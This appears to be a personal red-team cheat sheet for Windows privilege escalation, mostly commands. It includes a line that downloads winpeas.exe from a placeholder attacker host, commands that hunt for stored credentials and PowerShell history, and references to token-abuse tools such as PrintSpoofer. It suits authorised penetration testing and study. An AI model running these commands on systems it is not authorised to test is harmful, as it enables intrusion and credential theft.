https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/

### Winpeas
```
Invoke-WebRequest -Uri http://<Attack_ip>:<PORT>/winpeas.exe -Outfile winpeas.exe
```

### Basic Enumeration
``` bash
whoami /all                 # Privileges and groups
hostname                    # Hostname
systeminfo                  # OS, patch level
echo %USERNAME%             # Current user
net users                   # All local users
net localgroup administrators # Admin group members
tasklist                    # Running processes

#With Powershell
Get-LocalUser
Get-LocalGroupMember Administrators
Get-WmiObject win32_useraccount
```
### Credentials & Interesting Files
``` bash
dir /s *pass* == *cred* == *vnc* 2>nul
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type %userprofile%\Recent\*.lnk
#Check for saved RDP credentials:
cmdkey /list
```
### Privileges and Permissions
``` bash
#Check privileges:
whoami /priv
#Look for:
#SeImpersonatePrivilege
#SeAssignPrimaryTokenPrivilege
#SeDebugPrivilege
**Abusable with**:
- JuicyPotato
- PrintSpoofer
- RoguePotato
```
### **Services & Misconfigurations**
``` bash
#List services:
sc query sc qc [service-name]
#Look for:
#Unquoted service paths   
#Writable service executables/configs   

#Services running as SYSTEM, Check with:
accesschk.exe /accepteula -uwcqv "user" *
```
### **Scheduled Tasks / Startup**
``` bash
schtasks /query /fo LIST /v
#Look for:
#Tasks running with highest privileges

#Editable scripts or paths:
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```